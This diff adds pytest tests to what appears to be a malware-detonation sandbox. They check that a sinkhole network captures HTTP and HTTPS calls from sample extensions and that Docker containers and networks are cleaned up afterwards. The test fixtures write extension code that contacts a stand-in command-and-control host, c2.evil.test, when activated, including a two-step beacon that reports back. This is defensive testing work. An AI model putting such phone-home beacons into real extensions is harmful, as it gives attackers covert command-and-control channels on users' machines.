@@ -74,3 +74,60 @@ def test_detonate_timeout_force_reaps_container(tmp_path):
     assert leaked == set(), f"leaked detonation container(s): {leaked}"
     # A partial event log is still returned (not an exception).
     assert isinstance(events, list)
+
+
+def test_detonate_sinkhole_captures_multi_request_dialog(tmp_path):
+    # The SECOND request is issued only inside the response handler of the first,
+    # so it can exist only if a real reply came back — proving a live dialog that
+    # the --network none path structurally cannot produce.
+    sample = tmp_path / "ext"
+    sample.mkdir()
+    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
+    (sample / "extension.js").write_text(
+        "exports.activate=()=>new Promise((resolve)=>{"
+        "const http=require('http');"
+        "http.get('http://c2.evil.test/a',(res)=>{"
+        "  let d='';res.on('data',c=>d+=c);"
+        "  res.on('end',()=>{"
+        "    http.get('http://c2.evil.test/b?ack='+res.statusCode,(r2)=>{"
+        "      r2.on('data',()=>{});r2.on('end',resolve);"
+        "    }).on('error',resolve);"
+        "  });"
+        "}).on('error',resolve);"
+        "});",
+        encoding="utf-8")
+    events = orch.detonate(sample, ArtifactType.EXTENSION, timeout=60, sinkhole=True)
+    c2 = " ".join(e.detail for e in events if e.kind == "c2")
+    assert "/a" in c2
+    assert "/b?ack=200" in c2          # second hop fired after a real 200 reply
+
+
+def test_detonate_sinkhole_captures_https(tmp_path):
+    sample = tmp_path / "ext"
+    sample.mkdir()
+    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
+    (sample / "extension.js").write_text(
+        "exports.activate=()=>new Promise((resolve)=>{"
+        "require('https').get('https://c2.evil.test/tls',(res)=>{"
+        "  res.on('data',()=>{});res.on('end',resolve);"
+        "}).on('error',resolve);"
+        "});",
+        encoding="utf-8")
+    events = orch.detonate(sample, ArtifactType.EXTENSION, timeout=60, sinkhole=True)
+    assert any(e.kind == "c2" and "/tls" in e.detail for e in events)
+
+
+def test_sinkhole_teardown_leaves_no_containers_or_networks(tmp_path):
+    sample = tmp_path / "ext"
+    sample.mkdir()
+    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
+    (sample / "extension.js").write_text(
+        "exports.activate=()=>{require('http').get('http://c2.evil.test/x');};",
+        encoding="utf-8")
+    orch.detonate(sample, ArtifactType.EXTENSION, timeout=60, sinkhole=True)
+    nets = subprocess.run(["docker", "network", "ls", "--format", "{{.Name}}"],
+                          capture_output=True, text=True, timeout=30).stdout
+    ps = subprocess.run(["docker", "ps", "-a", "--format", "{{.Names}}"],
+                        capture_output=True, text=True, timeout=30).stdout
+    assert "analyst-net-" not in nets
+    assert "analyst-sink-" not in ps
